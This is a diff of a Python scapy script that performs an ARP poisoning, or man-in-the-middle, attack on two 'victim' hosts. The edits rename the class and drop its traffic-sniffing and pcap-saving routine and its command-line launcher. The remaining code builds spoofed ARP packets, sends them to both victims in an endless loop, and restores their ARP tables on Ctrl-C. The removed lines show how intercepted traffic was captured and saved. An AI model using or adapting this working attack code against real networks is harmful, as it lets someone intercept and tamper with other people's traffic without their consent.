@@ -1,16 +1,18 @@
 # Packages
 import scapy.all as scapy
-import sys, time, multiprocessing
+import sys, time
 
 # Constants
 DIVIDER = '=' * 60
 POISON_BREAK = 30
-STOP_MESSAGE = 'Press [CTRL-C] to\n1. Stop the ARP MITM Spoofing\n2. Save the sniffed packets to sniffedPackets.pcap\n3. Clean the ARP tables of the victims'
 
-# ARP Man in the Middle Spoofing Attack
-class ARPMITMSpoofing():
-    # Constructs the ARP Man in the Middle Spoofing Attack
+# ARP Poisoning Attack
+class ARPPoisoning():
+    # Constructs the ARP Poisoning Attack
     def __init__(self, victimOneIP, victimTwoIP, interface):
+        # Disables verbosity (command line) mode
+        scapy.conf.verb = 0
+        
         # Assign targets
         self.victimOneIP = victimOneIP
         self.victimTwoIP = victimTwoIP
@@ -26,18 +28,17 @@ class ARPMITMSpoofing():
 
     # Returns interactive prompt string
     def __repr__(self):
-        return 'ARPMITMSpoofing({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)
+        return 'ARPPoisoning({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)
 
     # Returns string representation
     def __str__(self):
-        return 'ARP MITM Spoofing on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
+        return 'ARP Poisoning on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
                 self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)
 
     # Print Initialization Message
     def printInitializationMessage(self):
-        print('{}\nRunning {}'.format(DIVIDER, self))
-        print('{}\n{}'.format(DIVIDER, STOP_MESSAGE))
-        print('{}\nSniffed Packets:'.format(DIVIDER))
+        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
+        print('Press [CTRL-C] to stop the ARP Poisoning and clean the ARP tables of the victims')
 
     # Execute the attack
     def execute(self):
@@ -57,29 +58,15 @@ class ARPMITMSpoofing():
                             pdst = self.victimTwoIP,
                             hwdst = self.victimTwoMac)
 
-        # Sniffing process
-        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)
-
-        # Start sniffing process
-        sniffingIncomingPacketsProcess.start()
-
-        # Infinitely poisons the victim and the spoofed device
+        # Infinitely poisons the victims
         while True:
             try: # Send poison packets
                 scapy.send(victimOnePoisonPacket)
                 scapy.send(victimTwoPoisonPacket)
                 time.sleep(POISON_BREAK)
             except KeyboardInterrupt: # CTRL-C was pressed
-                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                 self.clean() # Cleaning ARP tables of the victims
                 break # Stop the poisoning-loop
-
-    # Sniffs incoming packets
-    def sniffIncomingPackets(self):
-        bpfFilter = 'ip host {} || ip host {} '.format(victimOneIP, victimTwoIP) 
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = lambda x: x.summary()) # Sniff packets until key interrupt
-
-        scapy.wrpcap('sniffedPackets.pcap', incomingPackets) # Save sniffed packets
 
     # Clean ARP tables of the victims
     def clean(self):
@@ -97,19 +84,3 @@ class ARPMITMSpoofing():
             hwsrc=self.victimOneMac,
             pdst=self.victimTwoIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
-
-# Starts the program
-if __name__ == '__main__':
-    # Disables verbosity (command line) mode
-    scapy.conf.verb = 0
-
-    # Assign parameters to variables
-    victimOneIP = sys.argv[1]
-    victimTwoIP = sys.argv[2]
-    interface = sys.argv[3]
-
-    # Initialize Attack
-    attack = ARPMITMSpoofing(victimOneIP, victimTwoIP, interface)
-
-    # Execute attack
-    attack.execute()
